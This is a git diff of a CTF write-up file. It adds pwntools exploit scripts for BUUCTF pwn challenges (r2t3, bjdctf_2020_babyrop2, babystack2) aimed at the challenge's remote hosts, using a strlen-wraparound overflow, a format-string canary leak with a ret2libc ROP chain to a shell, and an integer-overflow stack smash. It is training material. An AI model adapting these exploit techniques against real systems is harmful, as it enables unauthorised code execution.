@@ -1,6 +1,6 @@
 # buuctf wp part1
 
-[bin file](https://github.com/song-10/notes/tree/master/writeups)
+[bin file](https://github.com/song-10/notes/tree/master/bin-file)
 
 ## [BJDCTF 2nd]one_gadget
 
@@ -58,17 +58,23 @@ p.interactive()
 from pwn import *
 context.arch = 'i386'
 
-p = process('./r2t3')
-# p = remote('node3.buuoj.cn',26564)
-elf = ELF('./r2t3',checksec=False)
+# there is a strcpy in name_check, it's misguide,
+# at the first we may try to make stack overflow by strcpy,
+# but it doesn't work,we can find it calculate the lenght of str by al,
+# in other words,as long as we input more than 255 characters,
+# we can pss the judge(v3 = strlen(s);if ( v3 <= 3u || v3 > 8u )),
+# and make stack over flow
 
-backdoor = elf.sym['_dl_registery']
+# p = process('./r2t3')
+p = remote('node3.buuoj.cn',27733)
 
-payload = 'A'*5 + '\0'*0x14 + p32(backdoor) # pass the check   v3 = strlen(s);  if ( v3 <= 3u || v3 > 8u )
-# payload = payload.ljust(0x14,'B') + p32(backdoor)
+payload = 'A'*0x15 + p32(0x0804858B) # the offset when we debug could find it
+payload = payload.ljust(0x104,'B')  # padding,and make al betwwen 3 and 8
+p.recvuntil("[+]Please input your name:")
 p.send(payload)
-sleep(1)
+p.recvuntil("Hello,My dear")
 p.interactive()
+
 ```
 
 ## [BJDCTF 2nd]r2t4
@@ -484,6 +490,57 @@ sleep(1)
 p.interactive()
 ```
 
+## bjdctf_2020_babyrop2
+
+```python
+from pwn import *
+from LibcSearcher import *
+context.arch='amd64'
+
+# there is a function which could leak canary by strfmt,
+# debug to find the offset is 11,
+# so just leak the canary and get shell by overflow
+
+# p = process('../Desktop/babyrop2')
+p = remote('node3.buuoj.cn',29177)
+elf = ELF('../Desktop/babyrop2',checksec=False)
+
+pop_rdi = 0x0000000000400993 # pop rdi ; ret
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+main = elf.sym['main']
+
+p.recvuntil("I'll give u some gift to help u!\n")
+p.sendline('%11$p') # leak the canary
+canary = int(p.recvuntil('\n',drop=True),16)
+log.success('canary = %#x',canary)
+
+payload = 'A'*(0x20-0x8) + p64(canary)
+payload = payload.ljust(0x20+0x8,'B')
+payload += flat([pop_rdi, puts_got, puts_plt, main])
+p.recvuntil('story!\n')
+p.send(payload)
+puts_addr = u64(p.recvuntil('\nCan',drop=True).ljust(8,'\x00'))
+log.success('puts_addr = %#x',puts_addr)
+
+p.recvuntil("I'll give u some gift to help u!\n")
+p.sendline('nop')
+
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+binsh = libc_base + libc.dump('str_bin_sh')
+log.info("system_addr = %#x, binsh = %#x"%(system_addr,binsh))
+
+payload = 'A'*(0x20-0x8) + p64(canary)
+payload = payload.ljust(0x20+0x8,'B')
+payload += flat([pop_rdi, binsh, system_addr])
+# p.recvuntil('story!\n')
+p.send(payload)
+sleep(1)
+p.interactive()
+```
+
 ## bjdctf_2020_babystack
 
 ```python
@@ -504,6 +561,27 @@ sleep(1)
 p.interactive()
 ```
 
+## bjdctf_2020_babystack2
+
+```python
+from pwn import *
+context.arch='amd64'
+
+# this program's input was limited by the first input,
+# and the judgement is 'if ( (signed int)nbytes > 10 )',
+# so just do it by int overflow
+
+# p = process('./babystack2')
+p = remote('node3.buuoj.cn',27056)
+
+payload = 'A'*(0x10+8)
+payload += p64(0x0000000000400726) # backdoor's address
+p.sendline('-1')
+sleep(0.1)
+p.send(payload)
+p.interactive()
+```
+
 ## Black Watch入群题
 
 ```python
@@ -511,7 +589,7 @@ from pwn import *
 from LibcSearcher import *
 context.arch='i386'
 
-# the second read limit the length of inputs to 0x20, 
+# the second read limit the length of inputs to 0x20,
 # we can't make satck overflow by this,
 # but we cuold control ebp to a fake satck to getshell by satck pivot
 
